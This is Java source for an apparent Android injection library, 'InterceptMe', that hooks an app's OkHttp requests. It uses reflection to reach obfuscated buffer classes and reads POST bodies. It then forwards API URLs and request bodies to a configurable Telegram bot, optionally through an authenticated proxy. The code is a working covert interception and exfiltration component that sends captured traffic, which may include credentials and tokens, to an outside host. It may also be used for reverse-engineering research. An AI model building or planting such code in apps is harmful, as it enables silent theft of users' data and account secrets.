package com.heavy87.InterceptMe;

import android.os.AsyncTask;

import org.json.JSONObject;

import java.io.IOException;
import java.lang.reflect.Method;
import java.net.Authenticator;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

import okhttp3.internal.http2.Http2Connection;

class NetworkTask extends AsyncTask<Void, Void, Void> {
    private String botURL;
    private Request request;
    boolean useProxy;
    private Map<String, Object> proxyParams;
    private final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    private Proxy buildProxy(Map<String, Object> proxyParams) {
        try {
            return new Proxy((Proxy.Type) proxyParams.get("type"), new InetSocketAddress(InetAddress.getByName(proxyParams.get("host").toString()), Integer.parseInt(proxyParams.get("port").toString())));
        } catch (UnknownHostException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void buildProxyParams(Proxy.Type type, String host, int port) {
        this.proxyParams = new HashMap<>();
        this.proxyParams.put("type", type);
        this.proxyParams.put("host", host);
        this.proxyParams.put("port", port);
        this.useProxy = true;
    }

    @Override
    protected Void doInBackground(Void... voids) {
        OkHttpClient httpClient;
        if (this.useProxy) {
            httpClient = new OkHttpClient.Builder().proxy(buildProxy(this.proxyParams)).build();
        } else {
            httpClient = new OkHttpClient();
        }
        try {
            httpClient.newCall(this.request).execute();
            System.out.print("test");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    NetworkTask(String key) {
        this.botURL = "https://api.telegram.org/bot" + key;
    }

    void setProxyParams(Proxy.Type type, final String host, final int port, final String login, final String password) {
        Authenticator.setDefault(new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                if (getRequestingHost().equals(host)) {
                    if (getRequestingPort() == port) {
                        return new PasswordAuthentication(login, password.toCharArray());
                    }
                    return null;
                }
                return null;
            }
        });
        this.buildProxyParams(type, host, port);
    }

    public void setProxyParams(Proxy.Type type, String host, int port) {
        this.buildProxyParams(type, host, port);
    }

    public void removeProxy() {
        this.proxyParams = new HashMap<String, Object>();
        this.useProxy = false;
    }

    void buildRequest(JSONObject jsonRequest) {
        RequestBody requestBody;
        if (Utils.isOldOkHttpLibrary()) {
            requestBody = RequestBody.create(this.JSON, jsonRequest.toString());
        } else {
            requestBody = RequestBody.create(jsonRequest.toString(), this.JSON);
        }
        this.botURL += "/sendMessage";
        this.request = new Request.Builder().url(this.botURL).post(requestBody).build();
    }
}

final class Telegram extends NetworkTask {

    Telegram(String key) {
        super(key);
    }

    void sendMessageToChat(String message, int chatId) {
        Map<String, Object> body = new HashMap<String, Object>();
        body.put("chat_id", chatId);
        body.put("text", message);
        body.put("parse_mode", "HTML");
        JSONObject jsonRequest = new JSONObject(body);
        buildRequest(jsonRequest);
    }
}

public final class InterceptMe extends Deobfuscator {


    static public void send(Request request) {
        try {
            //check settings is not default
            if (Settings.chatId == 0 || Settings.botKey == null)
                return;
            Telegram telegram = new Telegram(Settings.botKey);
            if (Settings.proxyHost != null) {
                telegram.setProxyParams(Settings.proxyType, Settings.proxyHost, Settings.proxyPort, Settings.proxyLogin, Settings.proxyPassword);
            }
            if (request.url().toString().contains("api")) {
                switch (request.method()) {
                    case "GET":
                        telegram.sendMessageToChat("<b>" + request.method() + "</b>\n" + "<code>" + request.url() + "</code>", Settings.chatId);
                        break;
                    case "POST":
                        Class<?> R_Buffer = getClassFromParamClass(Http2Connection.class, "writeData", 4, 2);
                        if (R_Buffer == null)
                            return;
                        Object buffer = R_Buffer.newInstance();
                        Method Buffer_readString = getMethodByParamsClass(R_Buffer, Charset.class);
                        Method RequestBody_writeTo = getMethodFromClass(RequestBody.class, "writeTo", 1);
                        if (RequestBody_writeTo == null)
                            return;
                        RequestBody_writeTo.invoke(request.body(), buffer);
                        String requestString = (String) Buffer_readString.invoke(buffer, Charset.defaultCharset());
                        telegram.sendMessageToChat("<b>" + request.method() + "</b>\n<code>" + request.url() + "</code>\n<u>body:</u>\n<code>" + requestString + "</code>", Settings.chatId);
                        break;
                    default:
                        return;
                }
                telegram.execute();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
